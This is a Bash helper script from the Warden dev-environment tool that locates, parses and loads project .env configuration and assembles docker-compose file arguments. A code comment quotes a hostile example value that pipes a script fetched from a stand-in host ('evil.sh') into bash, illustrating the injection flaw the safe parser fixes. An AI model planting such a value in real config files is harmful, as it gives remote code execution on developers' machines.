#!/usr/bin/env bash
[[ ! ${WARDEN_DIR} ]] && >&2 echo -e "\033[31mThis script is not intended to be run directly!\033[0m" && exit 1

## Supported config filenames, in precedence order.
WARDEN_ENV_FILENAME_CANONICAL=".warden.env"
WARDEN_ENV_FILENAME_DEPRECATED=".env"
WARDEN_ENV_FILENAMES=("${WARDEN_ENV_FILENAME_CANONICAL}" "${WARDEN_ENV_FILENAME_DEPRECATED}")

## Echo the config file in a directory, or return 1 if there is none. Both names
## are tested in one directory before a caller ascends, so a sub-stack's config
## beats its parent's. Pass "markers" to also require WARDEN_ENV_NAME/_TYPE, which
## is what tells a project root from an unrelated dotenv file during the walk.
function findEnvFile () {
    local envDir="${1}"
    local requireMarkers="${2:-}"
    local envFile envFileName

    for envFileName in "${WARDEN_ENV_FILENAMES[@]}"; do
        envFile="${envDir}/${envFileName}"

        if [[ ! -f "${envFile}" ]]; then
            continue
        fi

        if [[ "${requireMarkers}" = "markers" ]]; then
            grep "^WARDEN_ENV_NAME" "${envFile}" >/dev/null || continue
            grep "^WARDEN_ENV_TYPE" "${envFile}" >/dev/null || continue
        fi

        echo "${envFile}"
        return 0
    done

    return 1
}

function locateEnvPath () {
    local WARDEN_ENV_PATH="$(pwd -P)"
    local WARDEN_ENV_FILE=""

    while [[ "${WARDEN_ENV_PATH}" != "/" ]]; do
        if WARDEN_ENV_FILE="$(findEnvFile "${WARDEN_ENV_PATH}" markers)"; then
            break
        fi
        WARDEN_ENV_PATH="$(dirname "${WARDEN_ENV_PATH}")"
    done

    if [[ "${WARDEN_ENV_PATH}" = "/" ]]; then
        >&2 echo -e "\033[31mEnvironment config could not be found. Please run \"warden env-init\" and try again!\033[0m"
        return 1
    fi

    ## Resolve config symlink should it exist in project sub-directory allowing sub-stacks to use relative link to parent
    WARDEN_ENV_PATH="$(
        cd "$(
            dirname "$(
                (readlink "${WARDEN_ENV_FILE}" || echo "${WARDEN_ENV_FILE}")
            )"
        )" >/dev/null \
        && pwd
    )"

    echo "${WARDEN_ENV_PATH}"
}

## Safely load whitelisted KEY=VALUE pairs from a dotenv-style file.
## Replaces previous `eval "$(grep ...)"` pattern that allowed arbitrary
## command execution if a project's .env contained shell metacharacters
## (e.g. `WARDEN_FOO=$(curl evil.sh|bash)`), which is RCE on `warden env *`.
function loadEnvFile () {
    local envFile="${1}"
    local prefixRegex="${2}"
    [[ ! -f "${envFile}" ]] && return 0

    local line key value
    while IFS= read -r line || [[ -n "${line}" ]]; do
        line="${line%$'\r'}"
        [[ -z "${line}" ]] && continue
        [[ "${line}" =~ ^[[:space:]]*# ]] && continue
        [[ "${line}" != *=* ]] && continue

        key="${line%%=*}"
        value="${line#*=}"

        # Reject anything that is not a POSIX shell identifier (must start with
        # letter or underscore), and require it to match the requested prefix.
        [[ ! "${key}" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] && continue
        [[ ! "${key}" =~ ^${prefixRegex} ]] && continue

        # Strip surrounding single or double quotes — but never expand contents.
        if [[ "${value}" =~ ^\"(.*)\"$ ]] || [[ "${value}" =~ ^\'(.*)\'$ ]]; then
            value="${BASH_REMATCH[1]}"
        fi

        printf -v "${key}" '%s' "${value}"
        export "${key?}"
    done < "${envFile}"
}

## Warn on the deprecated filename, or on a .env.local left behind by a partial
## migration. The latter checks for Warden-owned keys because a migrated project
## may legitimately keep a framework-owned .env.local.
function warnOnDeprecatedEnvFile () {
    local envFile="${1}"
    local envPath="${2}"
    local legacyLocalFile="${envPath}/${WARDEN_ENV_FILENAME_DEPRECATED}.local"

    if [[ "$(basename "${envFile}")" = "${WARDEN_ENV_FILENAME_DEPRECATED}" ]]; then
        warnOnce "env-file-deprecated" \
            "Configuring Warden via \"${WARDEN_ENV_FILENAME_DEPRECATED}\" is deprecated and support will be removed in a future release.\n         Rename \"${envFile}\" to \"${envPath}/${WARDEN_ENV_FILENAME_CANONICAL}\" to silence this notice."
        return 0
    fi

    if [[ -f "${legacyLocalFile}" ]] \
        && grep -qE "^(WARDEN_|TRAEFIK_|PHP_)" "${legacyLocalFile}"
    then
        warnOnce "env-local-orphaned" \
            "\"${legacyLocalFile}\" holds Warden settings but is no longer read, because \"${envFile}\" takes precedence.\n         Move those overrides into \"${envFile}.local\"."
    fi
}

function loadEnvConfig () {
    local WARDEN_ENV_PATH="${1}"

    ## fall back to the canonical name so consumers always have a usable path
    WARDEN_ENV_FILE="$(findEnvFile "${WARDEN_ENV_PATH}")" \
        || WARDEN_ENV_FILE="${WARDEN_ENV_PATH}/${WARDEN_ENV_FILENAME_CANONICAL}"
    export WARDEN_ENV_FILE

    warnOnDeprecatedEnvFile "${WARDEN_ENV_FILE}" "${WARDEN_ENV_PATH}"

    loadEnvFile "${WARDEN_ENV_FILE}" "WARDEN_"
    loadEnvFile "${WARDEN_ENV_FILE}" "TRAEFIK_"
    loadEnvFile "${WARDEN_ENV_FILE}" "PHP_"

    ## the '.local' override (typically git-ignored) holds per-clone settings such
    ## as a distinct WARDEN_ENV_NAME. It is paired with whichever primary was
    ## resolved, so a framework's own .env.local is never read by Warden.
    loadEnvFile "${WARDEN_ENV_FILE}.local" "WARDEN_"
    loadEnvFile "${WARDEN_ENV_FILE}.local" "TRAEFIK_"
    loadEnvFile "${WARDEN_ENV_FILE}.local" "PHP_"

    WARDEN_ENV_NAME="${WARDEN_ENV_NAME:-}"
    WARDEN_ENV_TYPE="${WARDEN_ENV_TYPE:-}"
    WARDEN_ENV_SUBT=""

    case "${OSTYPE:-undefined}" in
        darwin*)
            WARDEN_ENV_SUBT=darwin
        ;;
        linux*)
            WARDEN_ENV_SUBT=linux
        ;;
        *)
            fatal "Unsupported OSTYPE '${OSTYPE:-undefined}'"
        ;;
    esac

    # Load mutagen settings if available
    if [[ -f "${WARDEN_HOME_DIR}/.env" ]]; then
      loadEnvFile "${WARDEN_HOME_DIR}/.env" "WARDEN_MUTAGEN_ENABLE"
    fi

    ## configure mutagen enable by default for MacOs
    if [[ $OSTYPE =~ ^darwin ]]; then
      export WARDEN_MUTAGEN_ENABLE=${WARDEN_MUTAGEN_ENABLE:-1}
    else
      # Disable mutagen for non-MacOS systems
      export WARDEN_MUTAGEN_ENABLE=0
    fi

    assertValidEnvType
}

function renderEnvNetworkName() {
    echo "${WARDEN_ENV_NAME}_default" | tr '[:upper:]' '[:lower:]'
}

function fetchEnvInitFile () {
    local envInitPath=""

    for ENV_INIT_PATH in \
        "${WARDEN_DIR}/environments/${WARDEN_ENV_TYPE}/init.env" \
        "${WARDEN_HOME_DIR}/environments/${WARDEN_ENV_TYPE}/init.env" \
        "${WARDEN_ENV_PATH}/.warden/environments/${WARDEN_ENV_TYPE}/init.env"
    do
        if [[ -f "${ENV_INIT_PATH}" ]]; then
            envInitPath="${ENV_INIT_PATH}"
        fi
    done

    echo $envInitPath
}

function fetchValidEnvTypes () {
    local lsPaths="${WARDEN_DIR}/environments/"*/*".base.yml"

    if [[ -d "${WARDEN_HOME_DIR}/environments" ]]; then
       lsPaths="${lsPaths} ${WARDEN_HOME_DIR}/environments/"*/*".base.yml"
    fi

    if [[ -d "${WARDEN_ENV_PATH}/.warden/environments" ]]; then
       lsPaths="${lsPaths} ${WARDEN_ENV_PATH}/.warden/environments/"*/*".base.yml"
    fi

    echo $(
        ls -1 $lsPaths \
            | sed -E "s#^${WARDEN_DIR}/environments/##" \
            | sed -E "s#^${WARDEN_HOME_DIR}/environments/##" \
            | sed -E "s#^${WARDEN_ENV_PATH}/.warden/environments/##" \
            | cut -d/ -f1 | sort | uniq | grep -v includes
    )
}

function assertValidEnvType () {
    if [[ -f "${WARDEN_DIR}/environments/${WARDEN_ENV_TYPE}/${WARDEN_ENV_TYPE}.base.yml" ]]; then
        return 0
    fi

    if [[ -f "${WARDEN_HOME_DIR}/environments/${WARDEN_ENV_TYPE}/${WARDEN_ENV_TYPE}.base.yml" ]]; then
        return 0
    fi

    if [[ -f "${WARDEN_ENV_PATH}/.warden/environments/${WARDEN_ENV_TYPE}/${WARDEN_ENV_TYPE}.base.yml" ]]; then
        return 0
    fi

    >&2 echo -e "\033[31mInvalid environment type \"${WARDEN_ENV_TYPE}\" specified.\033[0m"

    return 1
}

function appendEnvPartialIfExists () {
    local PARTIAL_NAME="${1}"
    local PARTIAL_PATH=""

    local BASE_PATHS=(
        "${WARDEN_DIR}/environments/includes"
        "${WARDEN_DIR}/environments/${WARDEN_ENV_TYPE}"
        "${WARDEN_HOME_DIR}/environments/includes"
        "${WARDEN_HOME_DIR}/environments/${WARDEN_ENV_TYPE}"
        "${WARDEN_ENV_PATH}/.warden/environments/includes"
        "${WARDEN_ENV_PATH}/.warden/environments/${WARDEN_ENV_TYPE}"
    )

    if [[ ${WARDEN_MUTAGEN_ENABLE} -eq 0 ]]; then
        local FILE_SUFFIXES=(".base.yml" ".${WARDEN_ENV_SUBT}.yml")
    else
        # Suffix .mutagen.yml is used for mutagen sync configuration
        # so using .mutagen_compose.yml for docker-compose configurations
        local FILE_SUFFIXES=(".base.yml" ".${WARDEN_ENV_SUBT}.yml" ".mutagen_compose.yml")
    fi

    for BASE_PATH in "${BASE_PATHS[@]}"; do
        for SUFFIX in "${FILE_SUFFIXES[@]}"; do
            PARTIAL_PATH="${BASE_PATH}/${PARTIAL_NAME}${SUFFIX}"
            if [[ -f "${PARTIAL_PATH}" ]]; then
                DOCKER_COMPOSE_ARGS+=("-f" "${PARTIAL_PATH}")
            fi
        done
    done
}
